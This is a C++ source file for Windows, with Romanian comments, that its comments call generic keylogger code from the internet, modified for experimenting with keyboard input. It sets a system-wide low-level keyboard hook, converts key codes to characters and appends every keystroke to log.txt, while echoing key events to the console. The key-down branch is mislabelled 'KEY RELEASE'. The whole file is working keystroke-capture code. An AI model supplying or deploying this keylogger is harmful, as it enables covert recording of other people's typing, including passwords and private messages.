#include <iostream>
#include <fstream>
#include <windows.h>
#include <string.h>

using namespace std;        //asta e in mare parte cod generic de keylogger de pe net, putin modificat ca sa va puteti juca cu inputurile
KBDLLHOOKSTRUCT kb;
HHOOK hKeyHook;

HANDLE hOut;

int shift = 0, caps = 0;
char buf[16];

char * translate(int vk, int up)
{
    if (up)
        {
        if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1))
            shift = 0;
        return 0;
        }
    else if ((vk == 0x10) || (vk == 0xa0) || (vk == 0xa1))
        {
        shift = 1;
        return 0;   //nu e necesar sa mentionam apasarea shiftului
        }

    memset(buf, 0, 16);

    if (vk < 0x29)
        {
        switch (vk)
        {
            case 0x08: strcpy(buf, "[BS]"); break;
            case 0x09: strcpy(buf, "[TAB]"); break;
            case 0x0d: strcpy(buf, "[CR]"); break;
            case 0x14: caps ^= 1; break;
            case 0x20: buf[0] = ' '; break;
            case 0x25: strcpy(buf, "[LT]"); break;
            case 0x26: strcpy(buf, "[UP]"); break;
            case 0x27: strcpy(buf, "[RT]"); break;
            case 0x28: strcpy(buf, "[DN]"); break;
        }
        return buf;
    }
    if (vk > 0x69 && vk < 0x70)
        buf[0] = (char)(vk - 0x40);
    else if (vk > 0x6f && vk < 0x88)
            sprintf(buf, "[F%d]", vk - 0x6f);   //tastele functionale: F1, F2,...
    else if (isalpha(vk))
        {
            if (!caps)
            {
                if (shift)
                    buf[0] = (char)(toupper(vk));
                else
                    buf[0] = (char)(tolower(vk));
            }
            else
            {
                if (!shift)
                    buf[0] = (char)(toupper(vk));
                else
                    buf[0] = (char)(tolower(vk));
            }
        }
        else
        {
            switch (vk)
            {
            case '1': if (!shift) buf[0]=(char)vk; else buf[0]='!'; break;
            case '2': if (!shift) buf[0]=(char)vk; else buf[0]='@'; break;
            case '3': if (!shift) buf[0]=(char)vk; else buf[0]='#'; break;
            case '4': if (!shift) buf[0]=(char)vk; else buf[0]='$'; break;
            case '5': if (!shift) buf[0]=(char)vk; else buf[0]='%'; break;
            case '6': if (!shift) buf[0]=(char)vk; else buf[0]='^'; break;
            case '7': if (!shift) buf[0]=(char)vk; else buf[0]='&'; break;
            case '8': if (!shift) buf[0]=(char)vk; else buf[0]='*'; break;
            case '9': if (!shift) buf[0]=(char)vk; else buf[0]='('; break;
            case '0': if (!shift) buf[0]=(char)vk; else buf[0]=')'; break;
            case 0xba: if (!shift) buf[0]=';'; else buf[0]=':'; break;
            case 0xbb: if (!shift) buf[0]='='; else buf[0]='+'; break;
            case 0xbc: if (!shift) buf[0]=','; else buf[0]='<'; break;
            case 0xbd: if (!shift) buf[0]='-'; else buf[0]='_'; break;
            case 0xbe: if (!shift) buf[0]='.'; else buf[0]='>'; break;
            case 0xbf: if (!shift) buf[0]='/'; else buf[0]='?'; break;
            case 0xc0: if (!shift) buf[0]='`'; else buf[0]='~'; break;
            case 0xdb: if (!shift) buf[0]='['; else buf[0]='{'; break;
            case 0xdc: if (!shift) buf[0]='\\'; else buf[0]='|'; break;
            case 0xdd: if (!shift) buf[0]=']'; else buf[0]='}'; break;
            case 0xde: if (!shift) buf[0]='\''; else buf[0]='\"'; break;
            }
        }
    return buf;

}

LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
    kb = *((KBDLLHOOKSTRUCT*)lParam);
    char * str = NULL;
    if(nCode == HC_ACTION)
    {

        if (wParam == WM_KEYUP)     //daca nu va plac culorile, deschideti un cmd, scrieti "color -h" si alegeti de acolo
        {
            SetConsoleTextAttribute(hOut, 0x0f);
            cout<<'[';
            SetConsoleTextAttribute(hOut, 0x04);
            cout<<"KEY RELEASE";
            SetConsoleTextAttribute(hOut, 0x0f);
            cout<<']';
            SetConsoleTextAttribute(hOut, 0x0c);
            cout<<" User released key with scan code: "<<kb.scanCode<<" and key code: "<<kb.vkCode<<"\n";
            str = translate(kb.vkCode, 1);
        }
        else if (wParam == WM_KEYDOWN)
        {
            SetConsoleTextAttribute(hOut, 0x0f);
            cout<<'[';
            SetConsoleTextAttribute(hOut, 0x02);
            cout<<"KEY RELEASE";
            SetConsoleTextAttribute(hOut, 0x0f);
            cout<<']';
            SetConsoleTextAttribute(hOut, 0x0a);
            cout<<"User pressed key with scan code: "<<kb.scanCode<<" and key code: "<<kb.vkCode<<"\n";
            str = translate(kb.vkCode, 0);
        }
    }
    if(str)
    {
        ofstream out ("log.txt", ios::app);
        out<<str;
        out.close();
    }

    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

int main()
{
    hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);
	        MSG message;
	        while(GetMessage(&message, NULL, 0, 0))
	        {
		                               TranslateMessage(&message);
		                               DispatchMessage(&message);
            }
	UnhookWindowsHookEx(hKeyHook);
    return 0;
}
